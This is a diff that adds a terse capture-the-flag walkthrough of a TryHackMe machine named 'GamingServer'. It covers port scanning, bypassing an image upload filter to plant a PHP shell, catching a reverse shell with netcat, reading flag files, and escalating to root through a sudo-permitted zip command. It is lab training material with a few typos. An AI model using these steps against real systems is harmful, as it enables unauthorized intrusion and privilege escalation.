@@ -1,0 +1,76 @@
+----------------                               ------------------
+               :::::::::::;| GAMINGSERVER |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "GAMINGSERVER".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 4 ports (22/SSH, 80/HTTP, 25565/MINECRAFT?, 31337/CUSTOM?)
+
+3. What's on port 80?
+ANS: Gaming server panel with upload page!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK UPLOAD PAGE.
+
+    http://<ip>/upload.php
+    "Try uploading PHP shell as .jpg"
+    "Error: Only images allowed!"
+
+2. BYPASS FILTER.
+
+    mv shell.php shell.php.jpg
+    intercept with Burp -> change to shell.php
+    "UPLOAD SUCCESS!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (GET SHELL)
+
+1. TRIGGER SHELL.
+
+    nc -lvnp 4444
+    http://<ip>/uploads/shell.php
+    "BOOM! WE'RE www-data!"
+
+2. FIND USER FLAG.
+
+    find / -name user* 2>/dev/null
+    cat /home/john/user.txt
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. CHECK SUDO.
+
+    sudo -l
+    "John can run /usr/bin/zip as root!"
+
+2. EXPLOIT ZIP.
+
+    TF=$(mktemp -u)
+    sudo zip $TF /etc/hosts -T -TT 'sh #'
+    "ROOT SHELL GET!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/john/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- GAMINGSERVER OWNED ----------
